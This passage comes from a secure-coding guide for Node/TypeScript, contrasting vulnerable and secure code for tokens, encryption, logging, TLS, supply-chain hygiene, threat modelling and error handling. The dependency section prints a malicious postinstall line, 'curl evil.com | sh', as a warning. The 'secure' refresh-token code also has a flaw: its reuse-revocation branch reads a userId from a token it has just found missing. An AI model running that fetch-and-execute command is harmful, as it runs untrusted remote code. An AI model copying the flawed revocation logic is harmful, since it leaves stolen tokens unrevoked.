  const payload = jwt.verify(refreshToken, REFRESH_SECRET)
  const newAccessToken = jwt.sign({ userId: payload.userId }, JWT_SECRET, { expiresIn: '1h' })
  res.json({ accessToken: newAccessToken })
  // ❌ old refreshToken still works!
})
```

**Secure (short-lived access + rotating refresh tokens):**

```typescript
// ✅ Access token: 15 minutes
function issueAccessToken(userId: string) {
  return jwt.sign({ userId }, JWT_SECRET, { expiresIn: '15m' })
}

// ✅ Refresh token: stored in DB, single-use with rotation
async function issueRefreshToken(userId: string) {
  const token = crypto.randomBytes(64).toString('hex')
  await db.refreshTokens.create({
    token: await hash(token),   // store hash only
    userId,
    expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000), // 7 days
  })
  return token
}

// ✅ Rotate on use — invalidate old, issue new
app.post('/auth/refresh', async (req, res) => {
  const { refreshToken } = req.body
  const tokenHash = await hash(refreshToken)
  const stored = await db.refreshTokens.findOne({ token: tokenHash })

  if (!stored || stored.expiresAt < new Date()) {
    // If already used — possible theft, revoke all user tokens
    if (!stored) await db.refreshTokens.deleteMany({ userId: stored?.userId })
    return res.status(401).json({ error: 'Invalid refresh token' })
  }

  // Invalidate old token, issue new pair
  await db.refreshTokens.delete({ id: stored.id })
  const newAccess  = issueAccessToken(stored.userId)
  const newRefresh = await issueRefreshToken(stored.userId)
  res.json({ accessToken: newAccess, refreshToken: newRefresh })
})
```

Store refresh tokens server-side (not in JWTs). Detect reuse of rotated tokens as a signal of compromise and revoke all sessions for the user.

Reference: [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)

---

## 3. Data Protection & Cryptography {#section-3}

**Impact:** HIGH
**Description:** Sensitive data must be encrypted at rest and in transit using modern algorithms (OWASP A04). Collect only what is needed; mask PII in all non-production contexts.

## Encrypt Sensitive Data at Rest with AES-256

**Impact: HIGH — CWE-311**

A database breach exposes unencrypted PII (SSNs, health records, payment data) in plaintext. Encrypt sensitive fields at the application layer with AES-256-GCM, so even a full database dump is useless without the encryption key. This is distinct from TLS in transit — encryption at rest protects against database exfiltration, backup theft, and insider threats.

**Vulnerable (PII stored in plaintext):**

```typescript
// ❌ SSN, card number, health data stored in plaintext
await db.patients.create({
  data: {
    name:          req.body.name,
    ssn:           req.body.ssn,           // plaintext — breach exposes millions of SSNs
    healthRecord:  req.body.healthRecord,
    cardNumber:    req.body.cardNumber,
  }
})
```

**Secure (field-level encryption with AES-256-GCM):**

```typescript
import { createCipheriv, createDecipheriv, randomBytes } from 'crypto'

const ENCRYPTION_KEY = Buffer.from(process.env.FIELD_ENCRYPTION_KEY!, 'hex')  // 32-byte key
const ALGORITHM = 'aes-256-gcm'

// ✅ Encrypt a field value
function encryptField(plaintext: string): string {
  const iv  = randomBytes(12)                        // 96-bit IV for GCM
  const cipher = createCipheriv(ALGORITHM, ENCRYPTION_KEY, iv)
  const encrypted = Buffer.concat([cipher.update(plaintext, 'utf8'), cipher.final()])
  const tag = cipher.getAuthTag()                    // authentication tag (16 bytes)
  // Store: iv + tag + ciphertext, base64-encoded
  return Buffer.concat([iv, tag, encrypted]).toString('base64')
}

// ✅ Decrypt a field value
function decryptField(encoded: string): string {
  const buf  = Buffer.from(encoded, 'base64')
  const iv   = buf.subarray(0, 12)
  const tag  = buf.subarray(12, 28)
  const data = buf.subarray(28)
  const decipher = createDecipheriv(ALGORITHM, ENCRYPTION_KEY, iv)
  decipher.setAuthTag(tag)
  return Buffer.concat([decipher.update(data), decipher.final()]).toString('utf8')
}

// ✅ Encrypt before storing, decrypt after fetching
await db.patients.create({
  data: {
    name:         req.body.name,
    ssnEncrypted: encryptField(req.body.ssn),
    healthRecord: encryptField(req.body.healthRecord),
    // cardNumber: DO NOT store — use Stripe/payment vault instead
  }
})

const patient = await db.patients.findById(id)
const ssn = decryptField(patient.ssnEncrypted)
```

Store the encryption key in a secrets manager, not alongside the data. For payment card data, use a PCI-DSS compliant vault (Stripe, Braintree) — never store card numbers yourself. Rotate encryption keys annually using envelope encryption.

Reference: [OWASP Cryptographic Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html)

---

## Collect Only the Data You Actually Need (Data Minimization)

**Impact: HIGH — CWE-359**

Every piece of PII you collect is a liability. Data breaches expose what you store. GDPR Article 5 and CCPA require collecting only data that is adequate, relevant, and limited to what is necessary. Unused data fields increase your breach impact, compliance scope, and regulatory risk.

**Vulnerable (over-collection):**

```typescript
// ❌ Collecting far more than needed for a newsletter signup
const UserSchema = z.object({
  email:       z.string().email(),
  firstName:   z.string(),
  lastName:    z.string(),
  dateOfBirth: z.string(),   // not needed for newsletter
  phone:       z.string(),   // not needed for newsletter
  address:     z.string(),   // not needed for newsletter
  ssn:         z.string(),   // definitely not needed
})

// ❌ Storing full API responses that contain unneeded PII
const githubUser = await fetchGithubUser(token)
await db.users.create({ data: githubUser })  // stores all 50+ GitHub fields
```

**Secure (minimal collection — only what you need):**

```typescript
// ✅ Newsletter signup — email only
const NewsletterSchema = z.object({
  email: z.string().email().max(254),
  name:  z.string().max(100).optional(),  // optional, for personalization only
})

// ✅ Extract only needed fields from third-party responses
const githubUser = await fetchGithubUser(token)
await db.users.create({
  data: {
    githubId:   githubUser.id,
    username:   githubUser.login,
    avatarUrl:  githubUser.avatar_url,
    email:      githubUser.email,
    // Not storing: followers, following, repos, bio, company, location, etc.
  }
})

// ✅ Define retention policies — auto-delete old data
// Delete sessions older than 30 days
await db.sessions.deleteMany({
  where: { createdAt: { lt: new Date(Date.now() - 30 * 24 * 60 * 60 * 1000) } }
})

// ✅ Anonymize instead of delete for analytics
await db.orders.update({
  where: { userId: deletedUserId },
  data: {
    userId:      null,
    email:       null,
    name:        'Deleted User',
    // Keep: orderId, amount, date — for financial records
  }
})
```

Review your data model quarterly: ask "do we actually use this field?". Delete or anonymize data you no longer need. Document your data retention policy and automate enforcement.

Reference: [GDPR Article 5 — Data Minimization](https://gdpr.eu/article-5-how-to-process-personal-data/)

---

## Mask or Redact PII in Logs and Error Messages

**Impact: HIGH — CWE-532**

Logs are frequently shared with third parties (Datadog, Splunk, Sentry), stored insecurely, or accessed by developers who should not see production PII. Logging full email addresses, SSNs, card numbers, or tokens creates privacy and compliance violations (GDPR, HIPAA, PCI-DSS). Mask or redact before any log output.

**Vulnerable (PII in logs):**

```typescript
// ❌ Full PII logged
console.log(`User login: email=${req.body.email}, password=${req.body.password}`)
console.log(`Processing payment for card: ${cardNumber}, cvv: ${cvv}`)
console.log(`Error for user ${user.ssn}:`, error)

// ❌ Entire request body logged (includes passwords, tokens)
app.use((req, res, next) => {
  console.log('Request body:', JSON.stringify(req.body))
  next()
})
```

**Secure (masking and selective logging):**

```typescript
// ✅ Mask helpers
function maskEmail(email: string): string {
  const [local, domain] = email.split('@')
  return `${local.charAt(0)}***@${domain}`  // j***@example.com
}

function maskCard(cardNumber: string): string {
  return `****-****-****-${cardNumber.slice(-4)}`  // ****-****-****-1234
}

function maskSsn(ssn: string): string {
  return `***-**-${ssn.slice(-4)}`  // ***-**-6789
}

function redactSensitiveKeys(obj: Record<string, unknown>): Record<string, unknown> {
  const SENSITIVE = new Set(['password', 'token', 'secret', 'cvv', 'ssn', 'cardNumber'])
  return Object.fromEntries(
    Object.entries(obj).map(([k, v]) =>
      SENSITIVE.has(k.toLowerCase()) ? [k, '[REDACTED]'] : [k, v]
    )
  )
}

// ✅ Structured logging with selective fields
logger.info('user.login', {
  userId:    user.id,              // OK — internal ID
  email:     maskEmail(user.email), // masked
  ip:        req.ip,               // OK for audit
  userAgent: req.headers['user-agent'],
  // NO password, NO full email
})

// ✅ Redact body before logging
app.use((req, res, next) => {
  const safeBody = redactSensitiveKeys(req.body)
  logger.debug('request', { method: req.method, path: req.path, body: safeBody })
  next()
})

// ✅ Use Pino with redact option
import pino from 'pino'
const logger = pino({
  redact: {
    paths: ['req.body.password', 'req.body.token', '*.ssn', '*.cardNumber'],
    censor: '[REDACTED]',
  },
})
```

Configure your logging library's redaction at the library level — not only in individual log calls — so accidental PII leaks are caught centrally. Test log output in staging with real-looking fake data.

Reference: [OWASP Logging Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html)

---

## Use TLS 1.2+ for All Data in Transit

**Impact: HIGH — CWE-319**

Data transmitted without TLS or with deprecated versions (TLS 1.0, 1.1, SSL 3.0) is vulnerable to interception, man-in-the-middle attacks, and protocol downgrade attacks (BEAST, POODLE, CRIME). All communication — between client and server, between microservices, and to databases — must use TLS 1.2 or higher. TLS 1.0 and 1.1 were officially deprecated by RFC 8996 in March 2021.

**Vulnerable (no TLS or deprecated versions):**

```typescript
// ❌ HTTP connection to database — credentials sent in plain text
import { Pool } from 'pg'
const pool = new Pool({
  host: 'db.internal.example.com',
  user: 'app_user',
  password: process.env.DB_PASSWORD,
  ssl: false,  // Plain text connection — password visible on network
})

// ❌ Internal microservice call without TLS
const response = await fetch('http://user-service.internal:3000/api/users/123')
// Authentication headers sent in plain text over the network

// ❌ Node.js HTTPS server allowing TLS 1.0
import https from 'https'
const server = https.createServer({
  key: fs.readFileSync('server.key'),
  cert: fs.readFileSync('server.crt'),
  // No minVersion set — defaults allow TLS 1.0 and 1.1
})
```

**Secure (TLS 1.2+ enforced everywhere):**

```typescript
// ✅ Database connection with TLS required
import { Pool } from 'pg'
const pool = new Pool({
  host: 'db.internal.example.com',
  user: 'app_user',
  password: process.env.DB_PASSWORD,
  ssl: {
    rejectUnauthorized: true,              // Verify server certificate
    ca: fs.readFileSync('/etc/ssl/db-ca.pem'),  // Pin the CA
    minVersion: 'TLSv1.2',                // Reject TLS 1.0/1.1
  },
})

// ✅ Internal service calls over HTTPS
const response = await fetch('https://user-service.internal:3000/api/users/123', {
  headers: { Authorization: `Bearer ${token}` },
})

// ✅ HTTPS server with TLS 1.2+ minimum
import https from 'https'
const server = https.createServer({
  key: fs.readFileSync('server.key'),
  cert: fs.readFileSync('server.crt'),
  minVersion: 'TLSv1.2',     // Reject TLS 1.0 and 1.1
  ciphers: [                   // Strong cipher suites only
    'TLS_AES_256_GCM_SHA384',
    'TLS_CHACHA20_POLY1305_SHA256',
    'ECDHE-RSA-AES256-GCM-SHA384',
  ].join(':'),
})
```

Enforce TLS for all internal and external communication. Use `rejectUnauthorized: true` to validate server certificates. For internal services, consider mutual TLS (mTLS) where both client and server authenticate.

Reference: [OWASP TLS Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Security_Cheat_Sheet.html)

---

## 4. Dependency & Supply Chain Security {#section-4}

**Impact:** MEDIUM-HIGH
**Description:** Third-party packages are a major vector for supply chain attacks (OWASP A03/A08). Audit dependencies regularly, pin versions via lock files, and minimize the attack surface.

## Audit Dependencies and Run Security Checks in CI

**Impact: MEDIUM-HIGH — CWE-1104**

Third-party packages are a major breach vector — the 2020 SolarWinds attack and thousands of npm package hijacks demonstrate that dependencies must be treated as untrusted code. Automated auditing in CI ensures known vulnerabilities are caught before deployment.

**Vulnerable (no dependency auditing):**

```bash
# ❌ Never auditing dependencies
npm install
# old lodash with prototype pollution — undetected for months
# old express with ReDoS — never flagged
```

**Secure (automated auditing in CI):**

```yaml
# ✅ GitHub Actions — audit on every push and weekly
name: Dependency Security Audit
on:
  push:
    branches: [main]
  pull_request:
  schedule:
    - cron: '0 9 * * 1'  # Every Monday 9am

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: npm audit (fail on high+)
        run: npm audit --audit-level=high

      - name: Snyk vulnerability scan
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        with:
          args: --severity-threshold=high

      - name: Check for outdated packages
        run: npx npm-check-updates --errorLevel 2
```

```bash
# ✅ Local development — add to pre-commit hook or Makefile
npm audit --audit-level=high

# ✅ For yarn
yarn audit --level high

# ✅ For pnpm
pnpm audit --audit-level high
```

```bash
# ✅ Review and fix
npm audit fix              # auto-fix compatible updates
npm audit fix --force      # semver-major updates (review manually)
npm audit                  # list all issues without fixing
```

Set a policy: CRITICAL/HIGH vulnerabilities block deployment; MEDIUM vulnerabilities have a 30-day SLA. Use Dependabot or Renovate for automatic dependency update PRs.

Reference: [OWASP Vulnerable and Outdated Components](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/)

---

## Always Commit and Verify Dependency Lock Files

**Impact: MEDIUM-HIGH — CWE-494**

Lock files (`package-lock.json`, `yarn.lock`, `pnpm-lock.yaml`) pin exact versions and integrity checksums of every dependency. Without them, `npm install` can silently pull newer (potentially compromised) versions. In CI, use `npm ci` (not `npm install`) to enforce the lock file and fail if it's out of sync.

**Vulnerable (no lock file enforcement):**

```bash
# ❌ .gitignore includes lock files — every install can differ
# .gitignore
package-lock.json
yarn.lock

# ❌ npm install in CI — ignores lock file, installs latest matching semver
RUN npm install  # Dockerfile

# ❌ --no-lockfile flag disables lock
yarn install --no-lockfile
```

**Secure (committed lock file + ci install):**

```bash
# ✅ Commit lock file — never add to .gitignore
# .gitignore should NOT contain: package-lock.json, yarn.lock, pnpm-lock.yaml

# ✅ Use npm ci in CI — enforces lock file exactly
RUN npm ci --omit=dev  # Dockerfile — faster, reproducible, fails if lock is stale

# ✅ Verify lock file integrity in CI
# package-lock.json contains sha512 integrity hashes for every package
```

```yaml
# ✅ GitHub Actions — use npm ci
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '22'
          cache: 'npm'
      - run: npm ci           # ✅ enforces lock file
      - run: npm test
      # NOT: npm install      ❌ ignores lock file
```

```bash
# ✅ Audit lock file for known compromised packages
npx better-npm-audit audit
# or
npm audit --package-lock-only

# ✅ Enable Subresource Integrity for CDN scripts (HTML)
# <script src="https://cdn.example.com/lib.js"
#         integrity="sha384-abc123..."
#         crossorigin="anonymous"></script>
```

Enable Dependabot version updates to keep the lock file current automatically. Review lock file diffs in PRs — unexpected version changes can signal supply chain attacks.

Reference: [npm ci documentation](https://docs.npmjs.com/cli/v10/commands/npm-ci)

---

## Prefer Narrow, Well-Maintained Packages with Minimal Footprint

**Impact: MEDIUM-HIGH — CWE-1104**

Each dependency you add transitively introduces dozens more packages, each a potential attack vector. Packages with wide permissions (filesystem, network, shell access), low maintenance activity, or a single maintainer are high-risk. Evaluate packages before adding them.

**Vulnerable (unnecessary broad dependencies):**

```bash
# ❌ Installing lodash for one utility function
npm install lodash         # 100+ functions — adds 70kB to bundle

# ❌ Package with excessive permissions
# package.json (malicious package)
# "scripts": { "postinstall": "curl evil.com | sh" }

# ❌ Using a package with known issues and no recent maintenance
npm install left-pad       # famous example of fragile supply chain
npm install event-stream   # was compromised in 2018 to steal Bitcoin
```

**Secure (minimal, audited dependencies):**

```bash
# ✅ Use native alternatives before adding a package
# Instead of lodash.get:
const value = obj?.deeply?.nested?.value ?? defaultValue

# Instead of axios (for simple requests):
const res = await fetch('https://api.example.com/data')
const data = await res.json()

# Instead of moment.js (heavy, unmaintained):
# Use date-fns (tree-shakeable) or Temporal API

# ✅ Evaluate a package before installing
npx package-phobia [package-name]  # check install size
npx is-esm [package-name]          # check ESM support
```

```typescript
// ✅ Checklist before adding a dependency:
// 1. Weekly downloads > 100k? (wide usage = more eyes on code)
// 2. Last publish < 6 months for active, or < 2 years for stable utilities?
// 3. GitHub stars > 500? Open issues triaged?
// 4. Only one maintainer? (high risk — consider forking critical utilities)
// 5. postinstall script present? (review carefully — common malware vector)
// 6. Does it request unusual permissions (child_process, eval, network)?

// ✅ Audit postinstall scripts across all deps
npx can-i-ignore-scripts  // check which postinstall scripts exist
npm install --ignore-scripts  // disable postinstall (may break some packages)
```

Regularly run `npm ls --depth=0` to audit direct dependencies. Remove packages you no longer use. Isolate high-risk dependencies (image processing, PDF generation) in separate services.

Reference: [OWASP Software Component Verification Standard](https://owasp.org/www-project-software-component-verification-standard/)

---

## 5. Secure Design {#section-5}

**Impact:** HIGH
**Description:** Insecure design cannot be fixed by code review alone (OWASP A06). Threat models, STRIDE analysis, and abuse case documentation during the design phase prevent architectural flaws that no amount of secure coding can fix.

## Require Threat Models for New Features and Services

**Impact: HIGH — CWE-1059**

Insecure design cannot be fixed by code review alone — it requires identifying threats before writing code. Without threat modeling, teams discover security flaws in production (or not at all). A lightweight STRIDE-based threat model during design forces explicit thinking about trust boundaries, data flows, and abuse scenarios. This is the primary defense against OWASP A06 "Insecure Design" — the category that captures architectural flaws no amount of secure coding can fix.

**Vulnerable (no threat model — security discovered too late):**

```typescript
// ❌ Feature designed and built without threat analysis
// User story: "As a user, I can share files with other users via a public link"
//
// What the team missed:
//   - No expiry on share links → permanent access even after revocation intent
//   - Sequential share IDs → attacker can enumerate all shared files
//   - No access logging → breach goes undetected
//   - No rate limiting on link creation → mass exfiltration tool
//   - Shared files include metadata with internal user IDs

app.post('/api/shares', async (req, res) => {
  const share = await db.shares.create({
    fileId: req.body.fileId,
    shareId: nextSequentialId++,        // Enumerable!
    // No expiry, no access controls, no audit trail
  })
  res.json({ url: `https://app.com/share/${share.shareId}` })
})
```

**Secure (lightweight STRIDE threat model as code review artifact):**

```markdown
# Threat Model: File Sharing Feature

## Data Flow
User → API Gateway → Share Service → Object Storage
                  ↘ Notification Service → Email

## Trust Boundaries
1. Public Internet ↔ API Gateway (authentication required)
2. API Gateway ↔ Internal Services (mTLS, service mesh)
3. Share Link ↔ Object Storage (pre-signed URL, time-limited)

## STRIDE Analysis

| Threat | Category | Mitigation |
|--------|----------|------------|
| Attacker guesses share IDs | Spoofing | Use UUID v4 (128-bit random), not sequential IDs |
| Revoked link still works | Tampering | Expire links after 7 days, support manual revocation |
| No record of who accessed | Repudiation | Log every access with IP, user-agent, timestamp |
| Shared file leaks metadata | Information Disclosure | Strip internal metadata before serving |
| Mass link creation for exfiltration | Denial of Service | Rate limit: 10 shares/user/hour |
| Link bypasses file permissions | Elevation of Privilege | Verify sharer still has access on every link use |

## Abuse Cases
- Attacker creates thousands of share links to exfiltrate entire drive
- Former employee's share links remain active after account deletion
- Search engines index share links, making files publicly discoverable
```

```typescript
// ✅ Implementation reflects threat model mitigations
app.post('/api/shares', rateLimit({ max: 10, window: '1h' }), async (req, res) => {
  const share = await db.shares.create({
    fileId: req.body.fileId,
    shareId: crypto.randomUUID(),       // Non-enumerable UUID
    createdBy: req.user.id,
    expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),  // 7-day expiry
  })
  auditLog.info({ action: 'share.created', fileId: req.body.fileId, userId: req.user.id })
  res.json({ url: `https://app.com/share/${share.shareId}` })
})
```

Create a threat model for every new feature that handles user data, authentication, or external integrations. The model doesn't need to be formal — a markdown file with STRIDE analysis and abuse cases in the PR is sufficient.

Reference: [OWASP Threat Modeling Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Threat_Modeling_Cheat_Sheet.html)

---

## 6. Error Handling & Logging {#section-6}

**Impact:** MEDIUM
**Description:** Improper error handling leaks system internals to attackers and causes resource exhaustion (OWASP A09/A10). Security events must be logged without capturing sensitive data. Resources must be cleaned up in all code paths.

## Implement Circuit Breakers and Graceful Degradation

**Impact: MEDIUM — CWE-754**

When a downstream service fails, applications that retry aggressively without backoff can amplify the failure into a cascading outage — overwhelming the struggling service, exhausting their own connection pools, and becoming unresponsive. A circuit breaker detects repeated failures and "opens" to stop sending requests, returning a fallback response instead. This protects both the downstream service (time to recover) and the calling application (remains responsive).

**Vulnerable (no circuit breaker — cascading failure):**

```typescript
// ❌ Unbounded retries — amplifies downstream failures
async function getRecommendations(userId: string): Promise<Product[]> {
  // If recommendation-service is down, this retries forever
  // Each request waits 30s (default timeout), blocking a thread
  // 100 concurrent users = 100 blocked connections = app is frozen
  while (true) {
    try {
      const res = await fetch(`http://recommendation-service/api/recommend/${userId}`)
      return await res.json()
    } catch {
      // Retry immediately — hammers the failing service
      await new Promise(r => setTimeout(r, 100))
    }
  }
}

// API handler blocks entirely when recommendations are unavailable
app.get('/api/products', async (req, res) => {
  const products = await getProducts()
  const recommendations = await getRecommendations(req.user.id)  // Blocks forever
  res.json({ products, recommendations })
})
```

**Secure (circuit breaker with graceful fallback):**

```typescript
import CircuitBreaker from 'opossum'

// ✅ Circuit breaker wraps the unreliable call
const recommendationBreaker = new CircuitBreaker(
  async (userId: string): Promise<Product[]> => {
    const res = await fetch(`http://recommendation-service/api/recommend/${userId}`, {
      signal: AbortSignal.timeout(3000),  // 3s timeout per request
    })
    if (!res.ok) throw new Error(`Service returned ${res.status}`)
    return res.json()
  },
  {
    timeout: 5000,           // Max 5s before considering a failure
    errorThresholdPercentage: 50,  // Open circuit after 50% failures
    resetTimeout: 30000,     // Try again after 30s
    volumeThreshold: 5,      // Minimum 5 requests before calculating error rate
  }
)

// ✅ Fallback returns cached/default data when circuit is open
recommendationBreaker.fallback(async (userId: string) => {
  // Return cached recommendations or popular items
  const cached = await cache.get(`recommendations:${userId}`)
  return cached ?? await getPopularProducts()
})

// ✅ API handler degrades gracefully — always responds
app.get('/api/products', async (req, res) => {
  const products = await getProducts()
  const recommendations = await recommendationBreaker.fire(req.user.id)
  res.json({ products, recommendations })  // Always returns, even if recommendations are fallback data
})
```

Apply circuit breakers to every external service call (APIs, databases, caches). Always provide a fallback that lets the application continue functioning with degraded features rather than failing completely.

Reference: [Microsoft Circuit Breaker Pattern](https://learn.microsoft.com/en-us/azure/architecture/patterns/circuit-breaker)

---

## Never Log Passwords, Tokens, or PII

**Impact: MEDIUM — CWE-532**

Log files are often stored with weaker access controls than production databases — aggregated in centralized logging systems, backed up to less secure storage, and accessible to broader engineering teams. Logging passwords, API keys, JWTs, credit card numbers, or PII gives attackers who gain access to logs a direct path to credentials and personal data. It also creates GDPR/PCI-DSS compliance violations.

**Vulnerable (sensitive data in logs):**

```typescript
// ❌ Logging the entire request body — includes passwords and tokens
app.post('/api/login', async (req, res) => {
  logger.info('Login attempt', { body: req.body })
  // Logs: { body: { email: "user@example.com", password: "MyS3cret!" } }

  const user = await authenticate(req.body.email, req.body.password)
  logger.info('Login successful', { user })
  // Logs: { user: { id: 1, email: "user@example.com", ssn: "123-45-6789" } }
})

// ❌ Logging authorization headers — exposes JWT/API keys
app.use((req, res, next) => {
  logger.debug('Incoming request', {
    url: req.url,
    headers: req.headers,  // Includes Authorization: Bearer eyJhbGci...
  })
  next()
})
```

**Secure (structured logging with redaction):**

```typescript
import pino from 'pino'

// ✅ Configure logger with automatic redaction of sensitive fields
const logger = pino({
  redact: {
    paths: [
      'req.headers.authorization',
      'req.headers.cookie',
      'body.password',
      'body.confirmPassword',
      'body.token',
      'body.creditCard',
      'body.ssn',
      'user.ssn',
      'user.password',
      '*.secret',
      '*.apiKey',
    ],
    censor: '[REDACTED]',
  },
})

// ✅ Log only safe, non-sensitive identifiers
app.post('/api/login', async (req, res) => {
  logger.info({ email: req.body.email }, 'Login attempt')
  // Logs: { email: "user@example.com", msg: "Login attempt" }

  const user = await authenticate(req.body.email, req.body.password)
  logger.info({ userId: user.id, role: user.role }, 'Login successful')
  // Logs: { userId: 1, role: "user", msg: "Login successful" }
})

// ✅ Mask PII helper for when logging is necessary
function maskEmail(email: string): string {
  const [local, domain] = email.split('@')
  return `${local[0]}***@${domain}`  // "u***@example.com"
}
```

Configure your logging framework to automatically redact sensitive fields. Never log `req.body` or `req.headers` without filtering. Use structured loggers (Pino, Winston) with built-in redaction support.

Reference: [OWASP Logging Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html)

---

## Never Expose Stack Traces or Internal Errors to Clients

**Impact: MEDIUM — CWE-209**

Stack traces reveal file paths, framework versions, library names, database schemas, and internal logic — a reconnaissance goldmine for attackers. In production, return only a generic error message to clients; log the full details server-side with a correlation ID so engineers can debug.

**Vulnerable (exposing internals):**

```typescript
// ❌ Default Express error handler — sends full stack to client
app.use((err: Error, req: Request, res: Response, next: NextFunction) => {
  res.status(500).json({ error: err.message, stack: err.stack })
  // Exposes: /app/src/routes/users.ts, column names, SQL queries, etc.
})

// ❌ Unhandled promise rejection exposes details in response
app.get('/user/:id', async (req, res) => {
  const user = await db.user.findOrFail(req.params.id)  // throws: "Record not found in table users"
  res.json(user)
  // Error message reveals table name and query pattern
})
```

**Secure (generic client response + full server-side logging):**

```typescript
import { randomUUID } from 'crypto'

// ✅ Centralized error handler — generic client response, full server log
app.use((err: unknown, req: Request, res: Response, _next: NextFunction) => {
  const errorId = randomUUID()

  // Log full details server-side with correlation ID
  logger.error({
    errorId,
    message: err instanceof Error ? err.message : String(err),
    stack:   err instanceof Error ? err.stack : undefined,
    url:     req.url,
    method:  req.method,
    userId:  req.user?.id,
  })

  // Determine HTTP status from error type
  if (err instanceof ValidationError) {
    return res.status(400).json({ error: 'Invalid request', errorId })
  }
  if (err instanceof AuthError) {
    return res.status(401).json({ error: 'Unauthorized', errorId })
  }
  if (err instanceof ForbiddenError) {
    return res.status(403).json({ error: 'Forbidden', errorId })
  }
  if (err instanceof NotFoundError) {
    return res.status(404).json({ error: 'Not found', errorId })
  }

  // ✅ Generic 500 — no internal details
  res.status(500).json({
    error:   'An unexpected error occurred',
    errorId, // user can report this ID; engineer can find full details in logs
  })
})

// ✅ Also handle unhandled rejections
process.on('unhandledRejection', (reason) => {
  logger.error({ message: 'Unhandled promise rejection', reason })
})
```

In development, you can expose full error details. Use `NODE_ENV` to gate stack trace exposure. Never expose raw database errors — they reveal schema structure and query patterns.

Reference: [OWASP Error Handling Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html)

---

## Ensure Exception-Safe Resource Cleanup

**Impact: MEDIUM — CWE-404**

Resources like database connections, file handles, network sockets, and encryption contexts must be released even when exceptions occur. Leaked resources exhaust connection pools, fill file descriptor tables, and eventually crash the application. In high-traffic systems, a single missing `finally` block can cause a denial-of-service condition within hours as the connection pool drains to zero.

**Vulnerable (resources leaked on exception):**

```typescript
// ❌ Database connection leaked if query throws
async function getUserOrders(userId: string): Promise<Order[]> {
  const connection = await pool.getConnection()
  // If this query throws, the connection is never released
  const orders = await connection.query('SELECT * FROM orders WHERE user_id = ?', [userId])
  connection.release()  // Never reached on error!
  return orders
}

// ❌ File handle leaked if processing throws
async function processUpload(filePath: string): Promise<void> {
  const handle = await fs.open(filePath, 'r')
  const content = await handle.readFile('utf-8')
  const parsed = JSON.parse(content)  // Throws on malformed JSON
  await processData(parsed)
  await handle.close()  // Never reached on error!
}

// ❌ Temporary file not cleaned up
async function generateReport(data: ReportData): Promise<string> {
  const tempPath = `/tmp/report-${Date.now()}.pdf`
  await writePDF(tempPath, data)
  const url = await uploadToS3(tempPath)  // If this throws, temp file remains on disk
  await fs.unlink(tempPath)  // Never reached on error!
  return url
}
```

**Secure (exception-safe resource cleanup):**

```typescript
// ✅ try/finally ensures connection is always released
async function getUserOrders(userId: string): Promise<Order[]> {
  const connection = await pool.getConnection()
  try {
    const orders = await connection.query('SELECT * FROM orders WHERE user_id = ?', [userId])
    return orders
  } finally {
    connection.release()  // Always runs, even on exception
  }
}

// ✅ Using Symbol.asyncDispose (TC39 Explicit Resource Management)
async function processUpload(filePath: string): Promise<void> {
  await using handle = await fs.open(filePath, 'r')
  // handle is automatically closed when scope exits, even on exception
  const content = await handle.readFile('utf-8')
  const parsed = JSON.parse(content)
  await processData(parsed)
}

// ✅ Cleanup in finally for temporary files
async function generateReport(data: ReportData): Promise<string> {
  const tempPath = `/tmp/report-${Date.now()}.pdf`
  try {
    await writePDF(tempPath, data)
    const url = await uploadToS3(tempPath)
    return url
  } finally {
    // Clean up temp file regardless of success or failure
    await fs.unlink(tempPath).catch(() => {})  // Ignore "file not found" errors
  }
}
```

Every resource acquisition must have a corresponding release in a `finally` block, `using` declaration, or equivalent. Audit code for connection `.getConnection()`, file `.open()`, and lock `.acquire()` calls without matching cleanup.

Reference: [CWE-404: Improper Resource Shutdown or Release](https://cwe.mitre.org/data/definitions/404.html)

---

## Log All Authentication and Authorization Security Events

**Impact: MEDIUM — CWE-778**

Security events that are not logged cannot be detected or investigated. Without an audit trail, breaches go undetected for months (industry average: 207 days). Log all authentication events — success and failure — with enough context to reconstruct the timeline of an attack. Feed logs to a SIEM for alerting.

**Vulnerable (no security event logging):**

```typescript
// ❌ Login endpoint with no logging
app.post('/auth/login', async (req, res) => {
  const user = await verifyCredentials(req.body.email, req.body.password)
  if (!user) return res.status(401).json({ error: 'Invalid credentials' })
  const token = issueToken(user)
  res.json({ token })
  // No record of who logged in, from where, or when
})
```

**Secure (structured security event logging):**

```typescript
import pino from 'pino'

const securityLogger = pino({
  name: 'security',
  redact: ['body.password', 'body.token'],
})

// ✅ Log all auth events with full context
app.post('/auth/login', authLimiter, async (req, res) => {
  const { email, password } = req.body
  const ip        = req.ip
  const userAgent = req.headers['user-agent']

  try {
    const user = await verifyCredentials(email, password)

    if (!user) {
      // ✅ Log failure — enough detail to detect brute force
      securityLogger.warn({
        event:     'auth.login.failure',
        email:     maskEmail(email),
        ip,
        userAgent,
        reason:    'invalid_credentials',
        timestamp: new Date().toISOString(),
      })
      return res.status(401).json({ error: 'Invalid credentials' })
    }

    // ✅ Log success
    securityLogger.info({
      event:     'auth.login.success',
      userId:    user.id,
      email:     maskEmail(email),
      ip,
      userAgent,
      timestamp: new Date().toISOString(),
    })

    res.json({ token: issueToken(user) })
  } catch (err) {
    securityLogger.error({ event: 'auth.login.error', ip, error: String(err) })
    res.status(500).json({ error: 'Login failed' })
  }
})

// ✅ Security events to log:
// auth.login.success / failure
// auth.logout
// auth.token.refresh
// auth.mfa.success / failure
// auth.password.change / reset
// authz.forbidden (403 on protected resource)
